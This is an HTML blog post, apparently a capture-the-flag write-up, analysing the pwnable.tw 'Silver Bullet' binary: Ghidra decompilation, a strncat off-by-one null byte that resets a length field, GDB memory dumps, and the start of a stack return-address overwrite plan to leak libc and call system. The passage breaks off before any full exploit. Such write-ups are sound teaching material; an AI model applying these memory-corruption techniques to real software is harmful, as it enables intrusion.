@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Pwnable.tw Silver Bullet | Th3R4nd0m’s blog</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Pwnable.tw Silver Bullet" />
+<meta name="author" content="Th3R4nd0m" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Recon" />
+<meta property="og:description" content="Recon" />
+<link rel="canonical" href="/2021/02/25/pwnable.tw-silver_bullet.html" />
+<meta property="og:url" content="/2021/02/25/pwnable.tw-silver_bullet.html" />
+<meta property="og:site_name" content="Th3R4nd0m’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-25T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Pwnable.tw Silver Bullet" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Pwnable.tw Silver Bullet","dateModified":"2021-02-25T00:00:00-05:00","datePublished":"2021-02-25T00:00:00-05:00","url":"/2021/02/25/pwnable.tw-silver_bullet.html","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/02/25/pwnable.tw-silver_bullet.html"},"author":{"@type":"Person","name":"Th3R4nd0m"},"description":"Recon","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Th3R4nd0m's blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Th3R4nd0m&#39;s blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/TR4nd0m"><i class="fab fa-twitter-square"></i></a><a class="color-purple-hover" href="https://github.com/Th3R4nd0m"><i class="fab fa-github-square"></i></a><a class="color-green-hover" href="https://app.hackthebox.eu/profile/84630"><i class="fab fa-cube"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="
+            https://github.com/Th3R4nd0m.png
+        " class="author-avatar" alt="Avatar" />
+    
+Hi. My second name is edmund. I like pentest, pwn and reverse engineering. Here I will be posting writeups for various challenges and HackTheBox machines.
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Pwnable.tw Silver Bullet</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/writeup/">writeup</a>
+      
+      <a class="tag" href="/tag/pwnable.tw/">pwnable.tw</a>
+      
+      <a class="tag" href="/tag/nullbyte/">nullbyte</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 25 Feb 2021</div>
+  
+  <h1 id="recon">Recon</h1>
+
+<p>I loaded the binary in Ghidra, and decompiled main:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_40</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="o">*</span><span class="n">local_3c</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">local_38</span> <span class="p">[</span><span class="mi">48</span><span class="p">];</span>
+  <span class="n">undefined4</span> <span class="n">local_8</span><span class="p">;</span>
+  
+  <span class="n">init_proc</span><span class="p">();</span>
+  <span class="n">local_8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">local_38</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x30</span><span class="p">);</span>
+  <span class="n">local_40</span> <span class="o">=</span> <span class="mh">0x7fffffff</span><span class="p">;</span>
+  <span class="n">local_3c</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">DAT_08048d06</span><span class="p">;</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">menu</span><span class="p">();</span>
+        <span class="n">iVar1</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+        <span class="n">power_up</span><span class="p">(</span><span class="n">local_38</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">if</span> <span class="p">(</span><span class="mi">2</span> <span class="o">&lt;</span> <span class="n">iVar1</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">create_bullet</span><span class="p">(</span><span class="n">local_38</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+<span class="nl">LAB_08048a05:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid choice"</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Don</span><span class="se">\'</span><span class="s">t give up !"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">goto</span> <span class="n">LAB_08048a05</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">beat</span><span class="p">(</span><span class="n">local_38</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_40</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Give me more power !!"</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>I also took a look at create_bullet:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">create_bullet</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">size_t</span> <span class="n">power</span><span class="p">;</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">param_1</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Give me your description of bullet :"</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">read_input</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="mh">0x30</span><span class="p">);</span>
+    <span class="n">power</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Your power is : %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">power</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">=</span> <span class="n">power</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Good luck !!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"You have been created the Bullet !"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The way this function handles the parameter made me think that the parameter is a struct, so I declared one in Ghidra:</p>
+
+<p><img src="/media/bullet_struct.png" alt="bullet_struct" /></p>
+
+<p>After changing the parameter type to our struct, everything looks more clear.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">create_bullet</span><span class="p">(</span><span class="n">bullet</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">size_t</span> <span class="n">power</span><span class="p">;</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="n">param_1</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Give me your description of bullet :"</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">read_input</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="mh">0x30</span><span class="p">);</span>
+    <span class="n">power</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">param_1</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Your power is : %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">power</span><span class="p">);</span>
+    <span class="n">param_1</span><span class="o">-&gt;</span><span class="n">power</span> <span class="o">=</span> <span class="n">power</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Good luck !!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"You have been created the Bullet !"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Looks like the power is equal to the length of the description, and the max length is 0x30 -&gt; max power = 0x30.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">undefined4</span> <span class="nf">beat</span><span class="p">(</span><span class="n">bullet</span> <span class="o">*</span><span class="n">the_bullet</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">param2</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">undefined4</span> <span class="n">uVar1</span><span class="p">;</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"You need create the bullet first !"</span><span class="p">);</span>
+    <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"&gt;----------- Werewolf -----------&lt;"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">" + NAME : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">param2</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">" + HP : %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">*</span><span class="n">param2</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"&gt;--------------------------------&lt;"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Try to beat it ....."</span><span class="p">);</span>
+    <span class="n">usleep</span><span class="p">(</span><span class="mi">1000000</span><span class="p">);</span>
+    <span class="o">*</span><span class="n">param2</span> <span class="o">=</span> <span class="o">*</span><span class="n">param2</span> <span class="o">-</span> <span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">power</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">param2</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Oh ! You win !!"</span><span class="p">);</span>
+      <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Sorry ... It still alive !!"</span><span class="p">);</span>
+      <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Hm….looks like we need to create another struct for param2.</p>
+
+<p><img src="/media/werewolf_struct.png" alt="werewolf_struct" /></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">beat</span><span class="p">(</span><span class="n">bullet</span> <span class="o">*</span><span class="n">the_bullet</span><span class="p">,</span><span class="n">w_wolf</span> <span class="o">*</span><span class="n">werewolf</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">win</span><span class="p">;</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"You need create the bullet first !"</span><span class="p">);</span>
+    <span class="n">win</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"&gt;----------- Werewolf -----------&lt;"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">" + NAME : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">werewolf</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">" + HP : %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">werewolf</span><span class="o">-&gt;</span><span class="n">hp</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"&gt;--------------------------------&lt;"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Try to beat it ....."</span><span class="p">);</span>
+    <span class="n">usleep</span><span class="p">(</span><span class="mi">1000000</span><span class="p">);</span>
+    <span class="n">werewolf</span><span class="o">-&gt;</span><span class="n">hp</span> <span class="o">=</span> <span class="n">werewolf</span><span class="o">-&gt;</span><span class="n">hp</span> <span class="o">-</span> <span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">power</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">werewolf</span><span class="o">-&gt;</span><span class="n">hp</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Oh ! You win !!"</span><span class="p">);</span>
+      <span class="n">win</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Sorry ... It still alive !!"</span><span class="p">);</span>
+      <span class="n">win</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">win</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>So, to beat the werewolf, we need to lower his HP(which is very high -&gt;0x7fffffff) with our bullet’s power.</p>
+
+<p>We rename things in main() to make thing clearer.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">option</span><span class="p">;</span>
+  <span class="n">w_wolf</span> <span class="n">werewolf</span><span class="p">;</span>
+  <span class="n">bullet</span> <span class="n">the_bullet</span><span class="p">;</span>
+  
+  <span class="n">init_proc</span><span class="p">();</span>
+  <span class="n">the_bullet</span><span class="p">.</span><span class="n">power</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">the_bullet</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x30</span><span class="p">);</span>
+  <span class="n">werewolf</span><span class="p">.</span><span class="n">hp</span> <span class="o">=</span> <span class="mh">0x7fffffff</span><span class="p">;</span>
+  <span class="n">werewolf</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">"Gin"</span><span class="p">;</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">menu</span><span class="p">();</span>
+        <span class="n">option</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+        <span class="n">power_up</span><span class="p">(</span><span class="o">&amp;</span><span class="n">the_bullet</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">if</span> <span class="p">(</span><span class="mi">2</span> <span class="o">&lt;</span> <span class="n">option</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">create_bullet</span><span class="p">(</span><span class="o">&amp;</span><span class="n">the_bullet</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+<span class="nl">LAB_08048a05:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid choice"</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Don</span><span class="se">\'</span><span class="s">t give up !"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">goto</span> <span class="n">LAB_08048a05</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">option</span> <span class="o">=</span> <span class="n">beat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">the_bullet</span><span class="p">,</span><span class="o">&amp;</span><span class="n">werewolf</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Give me more power !!"</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Now to take a look at the last big function:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">power_up</span><span class="p">(</span><span class="n">bullet</span> <span class="o">*</span><span class="n">the_bullet</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">bullet</span> <span class="n">other_bullet</span><span class="p">;</span>
+  
+  <span class="n">other_bullet</span><span class="p">.</span><span class="n">power</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">other_bullet</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x30</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"You need create the bullet first !"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">power</span> <span class="o">&lt;</span> <span class="mh">0x30</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Give me your another description of bullet :"</span><span class="p">);</span>
+      <span class="n">read_input</span><span class="p">(</span><span class="o">&amp;</span><span class="n">other_bullet</span><span class="p">,</span><span class="mh">0x30</span> <span class="o">-</span> <span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">power</span><span class="p">);</span>
+      <span class="n">strncat</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">the_bullet</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">other_bullet</span><span class="p">,</span><span class="mh">0x30</span> <span class="o">-</span> <span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">power</span><span class="p">);</span>
+      <span class="n">other_bullet</span><span class="p">.</span><span class="n">power</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">other_bullet</span><span class="p">);</span>
+      <span class="n">other_bullet</span><span class="p">.</span><span class="n">power</span> <span class="o">=</span> <span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">power</span> <span class="o">+</span> <span class="n">other_bullet</span><span class="p">.</span><span class="n">power</span><span class="p">;</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Your new power is : %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">other_bullet</span><span class="p">.</span><span class="n">power</span><span class="p">);</span>
+      <span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">power</span> <span class="o">=</span> <span class="n">other_bullet</span><span class="p">.</span><span class="n">power</span><span class="p">;</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Enjoy it !"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"You can</span><span class="se">\'</span><span class="s">t power up any more !"</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>It creates another bullet, initializes both the name and the power with 0. If the primary bullet’s power is lower than 30, it reads the description for the second bullet, the size being <code class="language-plaintext highlighter-rouge">max_size - primary bullet's power</code>. After that, it uses strncat to concatenate the second bullet description to the first. After that, it sets the primary bullet’s power to <code class="language-plaintext highlighter-rouge">primary bullet power + second bullet power</code>. So where’s the vulnerability??
+Well, the vulnerability resides in the the use of strncat. A lot of <code class="language-plaintext highlighter-rouge">str</code> functions append a nullbyte to the destination string.</p>
+
+<p><img src="/media/strncat.png" alt="strncat" /></p>
+
+<p>So the destination string’s size must be <code class="language-plaintext highlighter-rouge">size(0x30)</code> + 1, but the description has only 0x30. Now, if we create a bullet with <code class="language-plaintext highlighter-rouge">strlen(description) = 0x30-X</code>, and we power it up using a bullet with <code class="language-plaintext highlighter-rouge">strlen(description) = X</code>. Let’s take <code class="language-plaintext highlighter-rouge">X = 1</code>, <code class="language-plaintext highlighter-rouge">primary bullet's description = "A"*0x2f</code>, <code class="language-plaintext highlighter-rouge">secondary bullet's description = "B"</code>.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">create</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x2f</span><span class="p">)</span>
+    <span class="n">powerup</span><span class="p">(</span><span class="sa">b</span><span class="s">"B"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We put a breakpoint just before the <code class="language-plaintext highlighter-rouge">strncat</code>, and we take a look at primary bullet’s struct in memory:</p>
+
+<p><img src="/media/bullet_memory.png" alt="bullet_memory" /></p>
+
+<p>We can also create a struct and load it in GDB to see things better.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">bullet</span><span class="p">{</span>
+    <span class="kt">char</span> <span class="n">description</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">power</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">bullet</span> <span class="n">the_bullet</span><span class="p">;</span></code></pre></figure>
+
+<p>We compile it: <code class="language-plaintext highlighter-rouge">gcc -m32 -g -c st.c</code> and we load it in GDB: <code class="language-plaintext highlighter-rouge">pwndbg&gt; add-symbol-file st.o 0</code>, and we use it:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; p *(struct bullet*) 0xff8558d4             
+$2 = {
+  description = 'A' &lt;repeats 47 times&gt;,
+  power = 47
+}
+</code></pre></div></div>
+
+<p>This is before the strncat. Now, we step, and inspect again:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/16x 0xff8558d4
+0xff8558d4:     0x41414141      0x41414141      0x41414141      0x41414141 |
+0xff8558e4:     0x41414141      0x41414141      0x41414141      0x41414141 | -&gt; description
+0xff8558f4:     0x41414141      0x41414141      0x41414141      0x42414141 |
+0xff855904:     0x00000000      0x00000000      0xf7ddc637      0x00000001
+                ----------
+                power = 0
+
+pwndbg&gt; p *(struct bullet*) 0xff8558d4
+$3 = {
+  description = 'A' &lt;repeats 47 times&gt;, "B", 
+  power = 0
+}
+</code></pre></div></div>
+<p>So what happened?? As we all know, strncat appends a nullbyte after it concatenates the string. So, after “B” came a “\x00”, which overwrote power’s LSB, setting it to 0. After <code class="language-plaintext highlighter-rouge">strncat</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="n">other_bullet</span><span class="p">.</span><span class="n">power</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">other_bullet</span><span class="p">);</span> <span class="c1">// other_bullet.power = 1 (a single "B")</span>
+      <span class="n">other_bullet</span><span class="p">.</span><span class="n">power</span> <span class="o">=</span> <span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">power</span> <span class="o">+</span> <span class="n">other_bullet</span><span class="p">.</span><span class="n">power</span><span class="p">;</span> <span class="c1">// other_bullet.power = 0 + 1 = 1</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Your new power is : %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">other_bullet</span><span class="p">.</span><span class="n">power</span><span class="p">);</span>
+      <span class="n">the_bullet</span><span class="o">-&gt;</span><span class="n">power</span> <span class="o">=</span> <span class="n">other_bullet</span><span class="p">.</span><span class="n">power</span><span class="p">;</span> <span class="c1">// the_bullet-&gt;power = 1</span>
+</code></pre></div></div>
+
+<p>Ok….now what? Well, we can call power_up again (we pass the if check, because the_bullet-&gt;power &lt; 0x30) and concatenate again, overwriting a lot of things on the stack.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This is before strncat
+
+pwndbg&gt; x/16x 0xff8558d4
+0xff8558d4:     0x41414141      0x41414141      0x41414141      0x41414141 |
+0xff8558e4:     0x41414141      0x41414141      0x41414141      0x41414141 | -&gt; description
+0xff8558f4:     0x41414141      0x41414141      0x41414141      0x42414141 |
+0xff855904:     0x000000|01     0x00000000      0xf7ddc637      0x00000001
+                ---------
+       The concatenated string will start from here  
+</code></pre></div></div>
+
+<p>So, what string do we choose to concatenate? Well, we need high power, so we start with <code class="language-plaintext highlighter-rouge">"\xff" * 3 (*3, because the LSB is already 0x01)</code>. After that, comes EBP, which we can overwrite with anything(<code class="language-plaintext highlighter-rouge">"A"*4</code>), and the ESP(return address), which we can overwrite with everything we need. What do we need? Well, the need a libc leak for us to get the <code class="language-plaintext highlighter-rouge">system</code>’s function address. How do we get a leak? We call <code class="language-plaintext highlighter-rouge">puts(puts_got_entry)</code>. How do we do that?
+Well, on x32 binaries, it’s like this:</p>
